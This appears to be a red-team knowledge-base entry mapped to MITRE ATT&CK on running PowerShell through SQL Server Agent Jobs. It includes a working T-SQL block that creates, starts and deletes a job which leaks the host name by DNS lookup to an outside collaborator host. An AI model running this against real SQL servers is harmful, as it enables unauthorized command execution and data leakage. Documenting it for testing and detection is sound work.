---
id: 4ae6131f-6f64-4501-bc35-53b851138b13
name: SQL Agent Job PowerShell Execution
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:20.525712+00:00'
updated_at: '2023-04-10T20:36:46.425907+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[PowerShell|T1086 - PowerShell]]'
- '[[Scheduled Task|T1053 - Scheduled Task]]'
tags:
- '[[Agent Jobs]]'
- '[[Execute commands through SQL Agent Job service]]'
- '[[MSSQL Server]]'
commands:
- '[[Create PowerShell job and execute nslookup command]]'
---

# SQL Agent Job PowerShell Execution

## Summary

This procedure involves creating and executing a PowerShell script through the SQL Server Agent Job service. The PowerShell script can contain any command, in this case nslookup command is used as an example. This technique can be used by an adversary to execute commands on a target system, and can

## Description

# Description

This procedure involves creating and executing a PowerShell script through the SQL Server Agent Job service. The PowerShell script can contain any command, in this case nslookup command is used as an example. This technique can be used by an adversary to execute commands on a target system, and can be used to perform various post-exploitation activities, such as reconnaissance or lateral movement.

The SQL Server Agent Job service is used to schedule and automate administrative tasks on a SQL Server instance. By creating a job and executing a PowerShell script through the service, an adversary can execute any command on the target system. This technique can be used to bypass endpoint security solutions, as the execution is performed by a legitimate service.

This technique has a high business value, as it allows an adversary to execute any command on the target system, which can lead to data theft, system compromise, or disruption of business operations.

## Requirements

1. Access to a SQL Server instance

1. Permissions to create and execute SQL Server Agent Jobs

1. PowerShell installed on the target system

## Defense

1. Monitor SQL Server Agent Jobs for suspicious activity

1. Limit permissions for creating and executing SQL Server Agent Jobs to trusted users only

1. Implement endpoint security solutions to detect and prevent PowerShell execution

## Objectives

1. Execute commands on the target system

1. Perform reconnaissance on the target system

1. Move laterally within the target network

# Instructions

1. To run a SQL Server Agent Job with a PowerShell script, use the Invoke-SQLOSCmdAgentJob cmdlet. Specify the subsystem as PowerShell, provide the SQL Server instance name, and the base64 encoded PowerShell script. You can also provide a username and password with sufficient permissions to execute the job.

**Code**: [[Invoke-SQLOSCmdAgentJob -Subsystem PowerShell -Use]]

> The Invoke-SQLOSCmdAgentJob cmdlet is used to execute SQL Server Agent Jobs with a specified subsystem. In this case, the subsystem is PowerShell. The -Instance parameter specifies the name of the SQL Server instance where the job will be executed. The -Command parameter specifies the base64 encoded PowerShell script that will be executed. The -Verbose parameter provides detailed output about the execution of the job. Additionally, you can provide a username and password with sufficient permissions to execute the job. This cmdlet also supports other subsystem options such as CmdExec, VBScript, and Jscript.

2. This command creates a SQL Server Agent job that executes a PowerShell command to perform an nslookup on the computer name. The command is executed with a retry attempt of 1 and a retry interval of 5 seconds. The job is then started and can be monitored in the SQL Server Agent job history. Finally, the job is deleted using the sp_delete_job stored procedure.

**Code**: [[USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_]]

> The @job_name parameter specifies the name of the job to be created. The @step_name parameter specifies the name of the job step. The @subsystem parameter specifies the type of command being executed, in this case, PowerShell. The @command parameter specifies the PowerShell command to be executed, which performs an nslookup on the computer name. The $env:COMPUTERNAME[10] variable is used to extract the first 10 characters of the computer name. The @retry_attempts parameter specifies the number of times the job should be retried if it fails. The @retry_interval parameter specifies the number of seconds to wait before retrying the job. The sp_add_jobserver stored procedure is used to add the job to the SQL Server Agent. The sp_start_job stored procedure is used to start the job. The sp_delete_job stored procedure is used to delete the job.

**Command** ([[Create PowerShell job and execute nslookup command]]):

```powershell
USE msdb; 
EXEC dbo.sp_add_job @job_name = N'test_powershell_job1'; 
EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'$name=$env:COMPUTERNAME[10];nslookup "$name.redacted.burpcollaborator.net"', @retry_attempts = 1, @retry_interval = 5 ;
EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; 
EXEC dbo.sp_start_job N'test_powershell_job1';

-- delete
EXEC dbo.sp_delete_job @job_name = N'test_powershell_job1';
```

## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]
- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[PowerShell|T1086 - PowerShell]]
- [[Scheduled Task|T1053 - Scheduled Task]]

## Commands Used

- [[Create PowerShell job and execute nslookup command]]

## Tags

- [[Agent Jobs]]
- [[Execute commands through SQL Agent Job service]]
- [[MSSQL Server]]
